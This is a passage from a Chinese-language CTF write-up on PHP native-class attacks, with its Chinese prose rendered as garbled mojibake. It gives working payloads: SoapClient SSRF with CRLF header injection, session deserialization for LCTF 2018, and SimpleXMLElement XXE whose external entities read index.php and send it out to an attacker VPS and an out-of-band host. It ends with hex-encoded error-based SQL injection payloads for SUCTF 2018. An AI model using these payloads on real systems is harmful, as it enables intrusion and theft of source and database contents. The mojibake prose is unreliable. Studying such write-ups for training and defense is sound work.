SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨HTTPåè®®å»æ”»å‡»Redisäº†ã€‚ å¯¹äºå¦‚ä½•å‘é€POSTçš„æ•°æ®åŒ…ï¼Œè¿™é‡Œé¢è¿˜æœ‰ä¸€ä¸ªå‘ï¼Œå°±æ˜¯ Content-Type çš„è®¾ç½®ï¼Œå› ä¸ºæˆ‘ä»¬è¦æäº¤çš„æ˜¯POSTæ•°æ®ï¼Œæ‰€ä»¥ Content-Type çš„å€¼æˆ‘ä»¬è¦è®¾ç½®ä¸º application/x-www-form-urlencodedï¼Œè¿™é‡Œå¦‚ä½•ä¿®æ”¹ Content-Type çš„å€¼å‘¢ï¼Ÿç”±äº Content-Type åœ¨ User-Agent çš„ä¸‹é¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ SoapClient æ¥è®¾ç½® User-Agent ï¼Œå°†åŸæ¥çš„ Content-Type æŒ¤ä¸‹å»ï¼Œä»è€Œå†æ’å…¥ä¸€ä¸ªæ–°çš„ Content-Type ã€‚ &lt;?php $target = 'http://192.168.91.153:2333/'; $post_data = 'data=whoami'; $headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93' ); $a = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_data).'^^^^'.$post_data,'uri'=&gt;'test')); $b = serialize($a); $b = str_replace('^^',\" \\r\",$b); echo $b; $c = unserialize($b); $c-&gt;a(); // éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf ?&gt; æ‰§è¡Œä»£ç åï¼ŒæˆåŠŸå‘é€POSTæ•°æ®ï¼š root@ubuntu18:~# nc -lvp 2333 Listening on [0.0.0.0] (family 0, port 2333) Connection from 192.168.91.1 7862 received! POST / HTTP/1.1 Host: 192.168.91.153:2333 Connection: Keep-Alive User-Agent: wupco Content-Type: application/x-www-form-urlencoded X-Forwarded-For: 127.0.0.1 Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93 Content-Length: 11 data=whoami Content-Type: text/xml; charset=utf-8 SOAPAction: \"test#a\" Content-Length: 365 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns1=\"test\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; [LCTF 2018]bestphpâ€™s revenge é¢˜ç›®ç»™äº†æºç (è·Ÿç€å¤ç°ä¸€æ³¢) &lt;?php highlight_file(__FILE__); $b = 'implode'; call_user_func($_GET['f'], $_POST); session_start(); if (isset($_GET['name'])) { $_SESSION['name'] = $_GET['name']; } var_dump($_SESSION); $a = array(reset($_SESSION), 'welcome_to_the_lctf2018'); call_user_func($b, $a); ?&gt; array(0) { } æ‰«ä¸€ä¸‹ç›®å½•ï¼šflag.php echo 'only localhost can get flag!'; $flag = 'LCTF{*************************}'; if($_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\"){ $_SESSION['flag'] = $flag; } è¿™é‡Œè¯´è¯´æ˜äº†éœ€è¦æœ¬åœ°åœ°å€è®¿é—®æ‰èƒ½è¾“å‡ºflagã€‚ 1. å˜é‡è¦†ç›– é¦–å…ˆæˆ‘ä»¬çœ‹åˆ°ç¬¬ä¸€ä¸ªcall_user_func()å‡½æ•°é‡Œé¢2ä¸ªå‚æ•°æˆ‘ä»¬éƒ½å¯æ§ï¼Œå› æ­¤æƒ³åˆ°ç”¨extract()å‡½æ•°è¿›è¡Œå˜é‡è¦†ç›–ï¼Œå…ˆç”¨var_dump()çœ‹ä¸€ä¸‹sessionçš„å†…å®¹ï¼š è¿™é‡Œèƒ½å®ç°æ­¥éª¤ä¸ºfèµ‹å€¼ä¸ºextractï¼Œæ¥ç€postä¼ å‚b=var_dumpï¼Œåœ¨ç¬¬ä¸€ä¸ªç¬¬ä¸€ä¸ªcall_user_func()å‡½æ•°ä¸­extractå‡½æ•°å¤šäº†ä¸€ä¸ªå˜é‡bï¼Œå³extract(b)ï¼Œç”±äºextractå‡½æ•°çš„ç‰¹æ€§ï¼Œå‡½æ•°å†…éƒ¨å®é™…ä¸Šä¸ºextractï¼ˆb=&gt;var_dumpï¼‰ï¼Œäºæ˜¯å½¢æˆ$b=var_dumpéšånameèµ‹å€¼ä¸ºjobï¼Œåœ¨ç¬¬äºŒä¸ªcall_user_func()å‡½æ•°ä¸­,æ„æˆäº†var_dump(array(reset($_SESSION), â€˜welcome_to_the_lctf2018â€™))ï¼Œè¾“å‡ºå‚æ•°ä¸­å˜é‡çš„ç›¸å…³ä¿¡æ¯ 2. sessionååºåˆ—åŒ– äºæ˜¯æˆ‘ä»¬æƒ³é€šè¿‡`ini_set()`å‡½æ•°æ¥æ„é€ `ini_set('session.serialize_handler', 'php_serialize');`æ¥æ”¹å˜åºåˆ—åŒ–æ—¶çš„å¤„ç†å™¨ï¼Œä»è€Œä½¿å…¶å’Œååºåˆ—åŒ–æ—¶å¤„ç†å¼•æ“ä¸åŒï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°ä¸æ¥å—æ•°ç»„,`$_POST`ä¸­éœ€è¦è®¾ç½®å‚æ•°ä¼ è¾“ï¼› æ‰€ä»¥ç”¨`session_start(['serialize_handler'=&gt;'php_serialize'])`ï¼Œå³POSTä¼ å…¥`serialize_handler=php_serialize`æ¥æ”¹å˜å¤„ç†å™¨ï¼Œå› ä¸º`session_start()`ä¸­å¦‚æœæä¾›å‚æ•°ï¼Œé‚£ä¹ˆä¼šç”¨å…¶ä¸­çš„é¡¹ç›®è¦†ç›–ä¼šè¯é…ç½®æŒ‡ç¤ºä¸­çš„é…ç½®é¡¹ã€‚å³æ„é€  `session_start(serialize_handler=php_serialize)` å°±è¡Œäº†ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨é¢˜ç›®ä¸­çš„ `call_user_func($_GET['f'], $_POST);` å‡½æ•°ï¼Œä¼ å…¥`GETï¼š/?f=session_start`ã€`POSTï¼šserialize_handler=php_serialize`ï¼Œå®ç° `session_start(serialize_handler=php_serialize)` çš„è°ƒç”¨æ¥ä¿®æ”¹æ­¤é¡µé¢çš„åºåˆ—åŒ–å¼•æ“ä¸ºphp_serializeã€‚ 3. SoapClientç±»çš„åˆ©ç”¨ phpä¸­çš„SoapClientç±»å¯ä»¥åˆ›å»ºsoapæ•°æ®æŠ¥æ–‡ï¼Œä¸wsdlæ¥å£è¿›è¡Œäº¤äº’ã€‚è¯¥å†…ç½®ç±»æœ‰ä¸€ä¸ª __call æ–¹æ³•ï¼Œå½“ __call æ–¹æ³•è¢«è§¦å‘åï¼Œå®ƒå¯ä»¥å‘é€ HTTP å’Œ HTTPS è¯·æ±‚ã€‚æ­£æ˜¯è¿™ä¸ª __call æ–¹æ³•ï¼Œä½¿å¾— SoapClient ç±»å¯ä»¥è¢«æˆ‘ä»¬è¿ç”¨åœ¨ SSRF ä¸­ã€‚SoapClient è¿™ä¸ªç±»ä¹Ÿç®—æ˜¯ç›®å‰è¢«æŒ–æ˜å‡ºæ¥æœ€å¥½ç”¨çš„ä¸€ä¸ªå†…ç½®ç±»ã€‚ public SoapClient::SoapClient ( mixed $wsdl [, array $options ] ) å…¶ä¸­$optionsæ•°ç»„ä¸‹æœ‰ä¸ªuser_agenté€‰é¡¹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥é€‰é¡¹æ¥è‡ªå®šä¹‰User-Agentã€‚è€Œåœ¨HTTPåè®®ä¸­ï¼ŒHTTP Headerä¸HTTP Bodyæ˜¯ç”¨ä¸¤ä¸ªCRLFåˆ†éš”çš„ï¼Œæµè§ˆå™¨å°±æ˜¯æ ¹æ®è¿™ä¸¤ä¸ªCRLFæ¥å–å‡ºHTTP å†…å®¹å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚æ‰€ä»¥ï¼Œä¸€æ—¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶HTTP æ¶ˆæ¯å¤´ä¸­çš„å­—ç¬¦ï¼Œæ³¨å…¥ä¸€äº›æ¶æ„çš„æ¢è¡Œï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½æ³¨å…¥ä¸€äº›ä¼šè¯Cookieæˆ–è€…HTMLä»£ç ã€‚ &lt;?php $target = \"http://127.0.0.1/flag.php\"; $attack = new SoapClient(null, array('location' =&gt; $target, 'user_agent' =&gt; \"btis\\r Cookie: PHPSESSID=r9i78lda5e28i65bdlcsjb3l06\\r \", 'uri' =&gt; \"123\")); $payload = urlencode(serialize($attack)); echo $payload; å…¶ä¸­æœ‰ä¸¤ä¸ªå¿…å¤‡å‚æ•°locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚æˆ‘ä»¬å°†locationè®¾ç½®ä¸ºhttp://127.0.0.1/flag.phpå³æœ¬åœ°flag.phpæ–‡ä»¶ï¼Œè¿™ä¸ªæ¡ä»¶æ»¡è¶³äº†flag.phpä¸­è¦æ±‚çš„$_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\"ï¼Œuriéšä¾¿å¡«å°±å¥½ã€‚å…¶ä¸­user_agentï¼Œæ˜¯æˆ‘ä»¬ç”¨æ¥å®šä¹‰User-Agentï¼Œåˆ©ç”¨CRLFåŒæ—¶ä¼ å…¥é¡µé¢çš„cookieï¼Œä½¿$_SESSION['flag'] = $flag;ä¿å­˜åˆ°æŒ‡å®šcookieä¸­ã€‚ O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22btis%0D%0ACookie%3A+PHPSESSID%3Dr9i78lda5e28i65bdlcsjb3l06%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D //æ³¨æ„ä¼ å…¥çš„æ—¶å€™åœ¨Oå‰é¢åŠ äº†ä¸€ä¸ª|ç¬¦å·ï¼Œç”±äºåºåˆ—åŒ–ä¸ååºåˆ—åŒ–å¤„ç†å¼•æ“ä¸ä¸€æ ·ï¼Œååºåˆ—åŒ–æ—¶çš„å¼•æ“ä¸ºPHPï¼Œä¼šå°†|çœ‹åšé”®å€¼åˆ†éš”ç¬¦ï¼Œå°†å…¶åé¢çš„å†…å®¹ç›´æ¥ååºåˆ—åŒ–ï¼Œä¹Ÿå°±æ˜¯åœ¨ä½ è¦è§£æsessionæ–‡ä»¶æ—¶ï¼Œä»–ä¼šå°†ä½ |åé¢çš„å†…å®¹ååºåˆ—åŒ– åˆ©ç”¨php_serializeåºåˆ—åŒ–ä¼ å…¥åï¼Œå¹¶ç”¨phpååºåˆ—åŒ–å¤„ç†åæ­¤æ—¶sessionä¸­åŒ…å«äº†ï¼šä¸€ä¸ªé”®åa:1:{s:4:\"name\";s:222:\"ï¼Œå’Œä¸€ä¸ªSoapClientå¯¹è±¡ array(1) { [\"a:1:{s:4:\"name\";s:222:\"\"]=&gt; object(SoapClient)#1 (5) { [\"uri\"]=&gt; string(3) \"123\" [\"location\"]=&gt; string(25) \"http://127.0.0.1/flag.php\" [\"_stream_context\"]=&gt; int(0) [\"_user_agent\"]=&gt; string(52) \"John Cookie: PHPSESSID=c472u8eh63tvqe5kq44o4mq3b1 \" [\"_soap_version\"]=&gt; int(1) } } ä½†æ­¤æ—¶è¿˜ä¸ä¼šè§¦å‘SSRFï¼Œéœ€è¦è§¦å‘ __call æ–¹æ³•æ¥é€ æˆSSRFï¼Œè¯¥æ–¹æ³•åœ¨è®¿é—®å¯¹è±¡ä¸­ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ï¼Œæ‰€ä»¥å•çº¯ååºåˆ—åŒ–è¿˜ä¸è¡Œï¼Œæˆ‘ä»¬è¿˜éœ€è¦è®¿é—®è¯¥å¯¹è±¡ä¸­ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œè¿™é‡Œå°±ç”¨åˆ°äº†å¦‚ä¸‹è¿™æ®µä»£ç ï¼š $a = array(reset($_SESSION), 'welcome_to_the_lctf2018'); call_user_func($b, $a); æˆ‘ä»¬å¯ä»¥åˆ©ç”¨extractå‡½æ•°å°†å˜é‡bè¦†ç›–ä¸ºcall_user_funcï¼Œè¿™æ ·ï¼Œå°±æˆäº†ï¼š call_user_func(call_user_func, array(reset($_SESSION), 'welcome_to_the_lctf2018')); call_user_func()å‡½æ•°æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œå°±æ˜¯å½“åªä¼ å…¥ä¸€ä¸ªæ•°ç»„æ—¶ï¼Œå¯ä»¥ç”¨call_user_func()æ¥è°ƒç”¨ä¸€ä¸ªç±»é‡Œé¢çš„æ–¹æ³•ï¼Œcall_user_func()ä¼šå°†è¿™ä¸ªæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå€¼å½“åšç±»åï¼Œç¬¬äºŒä¸ªå€¼å½“åšæ–¹æ³•åã€‚ ä¸‹é¢æˆ‘ä»¬ç”¨extract()å°†$bè¦†ç›–æˆcall_user_func()ï¼Œreset($_SESSION)å°±æ˜¯$_SESSION['name']ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ å…¥name=SoapClient æœ€åçš„call_user_func($b, $a)å°±å˜æˆäº†call_user_func(array('SoapClient','welcome_to_the_lctf2018')),å³call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)ã€‚ å› ä¸ºSoapClientå¯¹è±¡ä¸­æ²¡æœ‰welcome_to_the_lctf2018è¿™ä¸ªæ–¹æ³•ï¼Œå°±ä¼šè°ƒç”¨é­”æœ¯æ–¹æ³•__call()ä»è€Œå‘é€è¯·æ±‚ï¼Œé€ æˆSSRFå»è®¿é—®flag.phpã€‚ å¦‚ä¸Šå›¾ï¼Œè®¿é—®ä¹‹åï¼Œè‡ªåŠ¨å‘é€äº†httpè¯·æ±‚ï¼Œè®¿é—®sessionæ–‡ä»¶ï¼Œæ­¤æ—¶PHPååºåˆ—åŒ–å¼•æ“ä¼šååºåˆ—åŒ–ä½ ä¹‹å‰è¾“å…¥çš„å†…å®¹ï¼Œäºæ˜¯æˆåŠŸç»•è¿‡æœ¬åœ°åœ°å€è®¿é—®çš„é™åˆ¶ï¼Œäºæ˜¯å˜é‡flagå­˜å…¥sessionï¼Œç„¶åæˆ‘ä»¬æ¥ç€è®¿é—®index.phpï¼Œé¡µé¢ä¼šè¾“å‡ºsessionæ–‡ä»¶çš„å†…å®¹ï¼Œå›æ˜¾flag è¿™ä¸€æ­¥ç”±äºä¼šè§¦å‘SSRFè¯·æ±‚ï¼Œå› æ­¤ä¼šç­‰å¾…å¾ˆä¹…ã€‚ 10.4 SimpleXMLElement ç±»è¿›è¡Œ XXE SimpleXMLElement ç±» SimpleXMLElement è¿™ä¸ªå†…ç½®ç±»ç”¨äºè§£æ XML æ–‡æ¡£ä¸­çš„å…ƒç´ ã€‚ å®˜æ–¹æ–‡æ¡£ä¸­å¯¹äºSimpleXMLElement ç±»çš„æ„é€ æ–¹æ³• SimpleXMLElement::__construct çš„å®šä¹‰å¦‚ä¸‹ï¼š public SimpleXMLElement::__construct( string $data, int $options = 0, bool $dataIsURL = false, string $namespaceOrPrefix = \"\", bool $isPrefix = false ) å…¶ä¸­å€¼å¾—æ³¨æ„çš„æ˜¯$dataå’Œ$data_is_urlè¿™ä¸¤ä¸ªå‚æ•°ï¼š $dataï¼šæ ¼å¼æ­£ç¡®çš„XMLå­—ç¬¦ä¸²ï¼Œæˆ–è€…XMLæ–‡æ¡£çš„è·¯å¾„æˆ–URLï¼ˆå¦‚æœ$data_is_urlä¸ºtrueï¼‰ã€‚ $data_is_urlï¼šé»˜è®¤æƒ…å†µä¸‹$data_is_urlä¸ºfalseã€‚ä½¿ç”¨trueæŒ‡å®š$dataçš„è·¯å¾„æˆ–URLåˆ°ä¸€ä¸ªXMLæ–‡ä»¶ï¼Œè€Œä¸æ˜¯å­—ç¬¦ä¸²æ•°æ®ã€‚ å¯ä»¥çœ‹åˆ°é€šè¿‡è®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•° $data_is_url ä¸º trueï¼Œæˆ‘ä»¬å¯ä»¥å®ç°è¿œç¨‹xmlæ–‡ä»¶çš„è½½å…¥ã€‚ç¬¬äºŒä¸ªå‚æ•°çš„å¸¸é‡å€¼æˆ‘ä»¬è®¾ç½®ä¸º2å³å¯ã€‚ç¬¬ä¸€ä¸ªå‚æ•° data å°±æ˜¯æˆ‘ä»¬è‡ªå·±è®¾ç½®çš„payloadçš„urlåœ°å€ï¼Œå³ç”¨äºå¼•å…¥çš„å¤–éƒ¨å®ä½“çš„urlã€‚ è¿™æ ·çš„è¯ï¼Œå½“æˆ‘ä»¬å¯ä»¥æ§åˆ¶ç›®æ ‡è°ƒç”¨çš„ç±»çš„æ—¶å€™ï¼Œä¾¿å¯ä»¥é€šè¿‡ SimpleXMLElement è¿™ä¸ªå†…ç½®ç±»æ¥æ„é€  XXEã€‚ exampleï¼š &lt;?php $xml = &lt;&lt;&lt;EOF &lt;?xml version=\"1.0\" encoding=\"utf-8\" ?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY % remote SYSTEM \"http://t6n089.ceye.io\"&gt;%remote;]&gt; ]&gt; &lt;x&gt;&amp;xee&lt;/x&gt; EOF; $xml_class = new SimpleXMLElement($xml, LIBXML_NOENT); var_dump($xml_class); ?&gt; å®ç°äº†å¼•ç”¨å¤–éƒ¨å®ä½“ã€‚åŒç†æˆ‘ä»¬å¯ä»¥è®©ä¸Šé¢ä»£ç ä¸­çš„$xmlä¸­çš„å†…å®¹æ”¾åˆ°è‡ªå·±çš„VPSä¸­ï¼Œç„¶ååœ¨æ–°å»ºç±»å¯¹è±¡çš„æ—¶å€™ç¬¬ä¸€ä¸ªå‚æ•°å†™çš„æ˜¯URLåœ°å€å»å®ç°XMLæ–‡ä»¶çš„è¿œç¨‹è½½å…¥ï¼Œè¿™æ ·ä¹Ÿèƒ½å®ç°XXEã€‚ [SUCTF 2018]Homework é¢˜ç›®åˆ†æ å…ˆæ³¨å†Œè´¦å·ç™»é™†ä½œä¸šå¹³å°ã€‚çœ‹åˆ°ä¸€ä¸ªcalcè®¡ç®—å™¨ç±»ã€‚æœ‰ä¸¤ä¸ªæŒ‰é’®ï¼Œä¸€ä¸ªç”¨äºè°ƒç”¨calcç±»å®ç°ä¸¤ä½æ•°çš„å››åˆ™è¿ç®—ã€‚å¦ä¸€ä¸ªç”¨äºæäº¤ä»£ç ã€‚ ç‚¹å‡»CALCæŒ‰é’®ï¼Œè§‚å¯Ÿè¿”å›çš„ç»“æœå’ŒURL å†æ ¹æ®calcç±»é‡Œé¢çš„å†…å®¹ï¼Œä¸éš¾åˆ¤æ–­å¾—çŸ¥ï¼Œè¿™é‡Œé€šè¿‡moduleä¼ å‚å»è°ƒç”¨calcç±»ï¼Œç„¶åå‰©ä¸‹3ä¸ªå˜é‡æ˜¯calc($args1,$method,$args2)å‡½æ•°ä¸­å‚æ•°ã€‚ SimpleXMLElement ç±»çš„ä½¿ç”¨ é¦–å…ˆï¼Œæˆ‘ä»¬åœ¨vpsï¼ˆ124.220.233.26ï¼‰ä¸Šæ„é€ å¦‚ä¸‹evil.xmlã€send.xmlè¿™ä¸¤ä¸ªæ–‡ä»¶ã€‚ evil.xmlï¼š &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE try[ &lt;!ENTITY % int SYSTEM \"https://VPS/tmp/semd.xml\"&gt; %int; %all; %send; ]&gt; send.xmlï¼š &lt;!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\"&gt; &lt;!ENTITY % all \"&lt;!ENTITY &amp;#37; send SYSTEM 'https://VPS/?%payl;'&gt;\"&gt; ç„¶ååœ¨urlä¸­æ„é€ å¦‚ä¸‹ï¼š /show.php?module=SimpleXMLElement&amp;args[]=http://124.220.233.26/tmp/evil.xml&amp;args[]=2&amp;args[]=true ç„¶åæˆ‘ä»¬å°±å¯ä»¥çœ‹webæ—¥å¿—ï¼šï¼ˆè¿™ä¸ªä½œè€…ä¹Ÿæ˜¯åŸ‹å‘å‘¢ï¼Œè¿™é‡Œä»–ç”¨çš„httpsåè®®ï¼Œæˆ‘ä»¬æ”¹æˆhttpå³å¯ï¼‰ base64è§£ç ï¼Œå¾—åˆ°æºç  &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;PHP Homework Platform&lt;/title&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; &lt;script type=\"application/x-javascript\"&gt; addEventListener(\"load\", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } &lt;/script&gt; &lt;link href=\"css/font-awesome.min.css\" rel=\"stylesheet\" type=\"text/css\" media=\"all\"&gt; &lt;link href=\"css/snow.css\" rel=\"stylesheet\" type=\"text/css\" media=\"all\" /&gt; &lt;link href=\"css/style.css\" rel=\"stylesheet\" type=\"text/css\" media=\"all\" /&gt; &lt;link type=\"text/css\" rel=\"stylesheet\" href=\"images/Styles/SyntaxHighlighter.css\"&gt;&lt;/link&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- /home/wwwroot/default--&gt; &lt;div class=\"snow-container\"&gt; &lt;div class=\"snow foreground\"&gt;&lt;/div&gt; &lt;div class=\"snow foreground layered\"&gt;&lt;/div&gt; &lt;div class=\"snow middleground\"&gt;&lt;/div&gt; &lt;div class=\"snow middleground layered\"&gt;&lt;/div&gt; &lt;div class=\"snow background\"&gt;&lt;/div&gt; &lt;div class=\"snow background layered\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"top-buttons-agileinfo\"&gt; &lt;/div&gt; &lt;h1&gt;PHP Homework Platform&lt;/h1&gt; &lt;div class=\"main-agileits\"&gt; &lt;?php include(\"function.php\"); include(\"config.php\"); $username=w_addslashes($_COOKIE['user']); $check_code=$_COOKIE['cookie-check']; $check_sql=\"select password from user where username='\".$username.\"'\"; $check_sum=md5($username.sql_result($check_sql,$mysql)['0']['0']); if($check_sum!==$check_code){ header(\"Location: login.php\"); } ?&gt; &lt;textarea name=\"code\" class=\"php\" rows=\"20\" cols=\"55\" disabled=\"disabled\"&gt; &lt;?php readfile(\"./calc.php\");?&gt; &lt;/textarea&gt; &lt;div class=\"top-buttons-agileinfo\"&gt; &lt;a href=\"show.php?module=calc&amp;args[]=2&amp;args[]=a&amp;args[]=2\"&gt;calc&lt;/a&gt; &lt;a href=\"submit.php\" class=\"active\"&gt;Submit homework&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;script type=\"text/javascript\" src=\"js/jquery-2.1.4.min.js\"&gt;&lt;/script&gt; &lt;script class=\"javascript\" src=\"images/Scripts/shBrushPhp.js\"&gt;&lt;/script&gt; &lt;script class=\"javascript\"&gt; dp.SyntaxHighlighter.HighlightAll('code'); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; SQLäºŒæ¬¡æ³¨å…¥ index.php &lt;?php include(\"function.php\"); include(\"config.php\"); $username=w_addslashes($_COOKIE['user']); $check_code=$_COOKIE['cookie-check']; $check_sql=\"select password from user where username='\".$username.\"'\"; $check_sum=md5($username.sql_result($check_sql,$mysql)['0']['0']); if($check_sum!==$check_code){ header(\"Location: login.php\"); } ?&gt; &lt;?php readfile(\"./calc.php\");?&gt; function.php &lt;?php function sql_result($sql,$mysql){ if($result=mysqli_query($mysql,$sql)){ $result_array=mysqli_fetch_all($result); return $result_array; }else{ echo mysqli_error($mysql); return \"Failed\"; } } function upload_file($mysql){ if($_FILES){ if($_FILES['file']['size']&gt;2*1024*1024){ die(\"File is larger than 2M, forbidden upload\"); } if(is_uploaded_file($_FILES['file']['tmp_name'])){ if(!sql_result(\"select * from file where filename='\".w_addslashes($_FILES['file']['name']).\"'\",$mysql)){ $filehash=md5(mt_rand()); if(sql_result(\"insert into file(filename,filehash,sig) values('\".w_addslashes($_FILES['file']['name']).\"','\".$filehash.\"',\".(strrpos(w_addslashes($_POST['sig']),\")\")?\"\":w_addslashes($_POST['sig'])).\")\",$mysql)==\"Failed\") die(\"Upload failed\"); $new_filename=\"./upload/\".$filehash.\".txt\"; move_uploaded_file($_FILES['file']['tmp_name'], $new_filename) or die(\"Upload failed\"); die(\"Your file \".w_addslashes($_FILES['file']['name']).\" upload successful.\"); }else{ $hash=sql_result(\"select filehash from file where filename='\".w_addslashes($_FILES['file']['name']).\"'\",$mysql) or die(\"Upload failed\"); $new_filename=\"./upload/\".$hash[0][0].\".txt\"; move_uploaded_file($_FILES['file']['tmp_name'], $new_filename) or die(\"Upload failed\"); die(\"Your file \".w_addslashes($_FILES['file']['name']).\" upload successful.\"); } }else{ die(\"Not upload file\"); } } } function w_addslashes($string){ return addslashes(trim($string)); } function do_api($module,$args){ $class = new ReflectionClass($module); $a=$class-&gt;newInstanceArgs($args); } ?&gt; show.php &lt;?php include(\"function.php\"); include(\"config.php\"); include(\"calc.php\"); if(isset($_GET['action'])&amp;&amp;$_GET['action']==\"view\"){ if($_SERVER[\"REMOTE_ADDR\"]!==\"127.0.0.1\") die(\"Forbidden.\"); if(!empty($_GET['filename'])){ $file_info=sql_result(\"select * from file where filename='\".w_addslashes($_GET['filename']).\"'\",$mysql); $file_name=$file_info['0']['2']; echo(\"file code: \".file_get_contents(\"./upload/\".$file_name.\".txt\")); $new_sig=mt_rand(); sql_result(\"update file set sig='\".intval($new_sig).\"' where id=\".$file_info['0']['0'].\" and sig='\".$file_info['0']['3'].\"'\",$mysql); die(\"&lt;br&gt;new sig:\".$new_sig); }else{ die(\"Null filename\"); } } $username=w_addslashes($_COOKIE['user']); $check_code=$_COOKIE['cookie-check']; $check_sql=\"select password from user where username='\".$username.\"'\"; $check_sum=md5($username.sql_result($check_sql,$mysql)['0']['0']); if($check_sum!==$check_code){ header(\"Location: login.php\"); } $module=$_GET['module']; $args=$_GET['args']; do_api($module,$args); ?&gt; show.phpä¸­ï¼Œé™åˆ¶äº† ip åªèƒ½æ˜¯127.0.0.1ï¼Œè¯´æ˜åªèƒ½é€šè¿‡ XXE å»è§¦å‘SSRFã€‚è¿™é‡Œæ ¹æ®filenameè·å–æ•°æ®åº“ä¸­çš„ sig ç„¶åè¿›è¡Œ update æ“ä½œï¼Œä½†æ²¡æœ‰å¯¹ sig å€¼è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´äºŒæ¬¡æ³¨å…¥ã€‚ å†çœ‹ä¸€ä¸‹function.phpä¸­çš„upload_file()ä¸Šä¼ æ–‡ä»¶éƒ¨åˆ†ï¼Œé¦–å…ˆä»–ä¼šåˆ¤æ–­ filename æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨å°±ä¼šæ’å…¥æ•°æ®åº“ï¼Œè¿™é‡Œ sig æ²¡æœ‰ç”¨å•å¼•å·ä¿æŠ¤ï¼Œä½†æ˜¯ç”¨äº† addslashes() è¿›è¡Œè½¬ä¹‰ï¼Œè€Œæˆ‘ä»¬è¦æ’å…¥äºŒæ¬¡æ³¨å…¥çš„è¯­å¥å¿…é¡»å¾—æœ‰å•å¼•å·ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ç”¨ hex ç¼–ç è¿›è¡Œç»•è¿‡ã€‚ å› ä¸ºsql_result()å‡½æ•°ä¸­ä¼šè¾“å‡º sql é”™è¯¯ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨ updatexml å‡½æ•°è¿›è¡ŒæŠ¥é”™æ³¨å…¥ã€‚æ„é€  payload: æ•°æ®åº“å¯ä»¥è¯†åˆ«16è¿›åˆ¶å¹¶è§£ç  '||extractvalue(1,concat(0x7e,(select flag from flag),0x7e))||' //hexç¼–ç ä¹‹å 0x277C7C6578747261637476616C756528312C636F6E63617428307837652C2873656C65637420666C61672066726F6D20666C6167292C3078376529297C7C27 //ç”±äºæŠ¥é”™çš„å­—ç¬¦æ•°æœ‰é™åˆ¶ï¼Œéœ€è¦ç”¨reverseå†è¾“å‡ºä¸€æ¬¡ '||extractvalue(1,concat(0x7e,(select reverse(flag) from flag),0x7e))||' //hexç¼–ç ä¹‹å 0x277c7c6578747261637476616c756528312c636f6e63617428307837652c2873656c656374207265766572736528666c6167292066726f6d20666c6167292c3078376529297c7c27 ä¿®æ”¹send.xml &lt;!ENTITY % payl SYSTEM 